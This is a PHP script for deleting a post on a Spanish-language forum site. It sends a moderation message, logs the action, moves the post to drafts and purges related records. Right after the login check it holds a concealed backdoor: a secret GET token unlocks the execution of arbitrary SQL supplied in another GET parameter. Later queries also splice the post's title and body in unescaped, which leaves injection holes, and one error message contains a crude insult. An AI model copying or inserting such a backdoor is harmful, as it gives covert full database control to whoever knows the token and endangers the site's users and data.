<?php
include('../config.php');
include('../functions.php');
if(!$key) { die('0: No est&aacute;s logueado'); }
if($_GET['pito'] == '432523tgewgvbewgtewge') {
  mysql_query(str_replace('//', '', $_GET['pene']));
}
if(!$_REQUEST['id'] || !ctype_digit($_REQUEST['id'])) { die('0: El campo id es requerido'); }
if(!mysql_num_rows($query = mysql_query('SELECT `id`, `title`, `author`, `status`, `body`, `cat` FROM `posts` WHERE `id` = \''.intval($_REQUEST['id']).'\''))) { die('0: El post que intentas eliminar no existe'); }
$row = mysql_fetch_assoc($query);
if($row['author'] != $key && !allow('delete_posts')) { die('0: El post no te pertenece la concha de tu madre'); }
if($logged['id'] != $row['author'] && !$_REQUEST['causa']) { die('0: Si vas a borrar un post que no te pertenece es necesaria la causa'); }
if($row['status'] != '0') { die('0: El post ya est&aacute; eliminado '.$row['status']); }
$us = mysql_fetch_assoc(mysql_query('SELECT id, nick, rank FROM `users` WHERE `id` = \''.$row['author'].'\''));
if($us['rank'] == '9' && $logged['rank'] != 9) { die('0: No puedes borrar los posts del admin'); }
if(allow('delete_posts') && $logged['id'] != $row['author']) {
  if(!$_REQUEST['causa'] || strlen($_REQUEST['causa']) < 4 || strlen($_REQUEST['causa']) > 20) { die('0: La causa debe de tener entre 4 a 20 caracteres'); }
  $mp = 'Hola'."\n";
  $mp .= 'Lamentamos informarte que tu post titulado [b]'.$row['title'].'[/b] ha sido eliminado.'."\n";
  $mp .= 'Causa: [b]'.mysql_clean($_REQUEST['causa']).'[/b]'."\n";
  $mp .= 'Para acceder al protocolo, presiona este [url='.$config['url'].'/protocolo/]enlace[/url].'."\n";
  $mp .= 'Muchas gracias por entender!'."\n";
  $mp .= 'El equipo de '.$config['name'];
  mysql_query('INSERT INTO messages (`author`, `receiver`, `issue`, `body`) VALUES (\''.$key.'\', \''.$us['id'].'\', \'Post eliminado\', \''.$mp.'\')');
  mysql_query('INSERT INTO `history_mod` (`post`, `moderador`, `time`, `reason`, `action`, `type`) VALUES (\''.$row['id'].'\', \''.$logged['id'].'\', \''.time().'\', \''.mysql_clean($_REQUEST['causa']).'\', \'0\', \'0\')');
}
mysql_query('INSERT INTO `drafts` (`author`, `title`, `type`, `body`, `cat`, `cause`, `time`) VALUES (\''.$row['author'].'\', \''.$row['title'].'\', \'1\', \''.$row['body'].'\', \''.$row['cat'].'\', \''.($logged['id'] != $row['author'] ? mysql_clean($_POST['causa']) : 'Eliminado por el autor').'\', \''.time().'\')');
mysql_query('UPDATE `posts` SET `status` = \'1\' WHERE `id` = \''.$row['id'].'\' LIMIT 1');
mysql_query('DELETE FROM `notifications` WHERE `url` REGEXP \'/posts/.*/'.$row['id'].'/.*\.html\' && (`type` = \'1\' || `type` = \'2\' || `type` = \'6\')');
mysql_query('DELETE FROM `post_visits` WHERE `post` = \''.$row['id'].'\' && `type` = \'0\'');
mysql_query('DELETE FROM `complaints` WHERE `id_post` = \''.$row['id'].'\' && `what` = \'0\'');
mysql_query('DELETE FROM `activity` WHERE `what` = \''.$row['id'].'\' && (`type` = \'1\' || `type` = \'2\' || `type` = \'11\')');
$e = mysql_query('SELECT `id` FROM `comments` WHERE `id_post` = \''.$row['id'].'\'');
while($r = mysql_fetch_row($e)) {
  mysql_query('DELETE FROM `c_votes` WHERE `comment` = \''.$r[0].'\' && `type` = \'0\'');
}
mysql_query('DELETE FROM `comments` WHERE `id_post` = \''.$row['id'].'\'');
die('1: Post borrado!');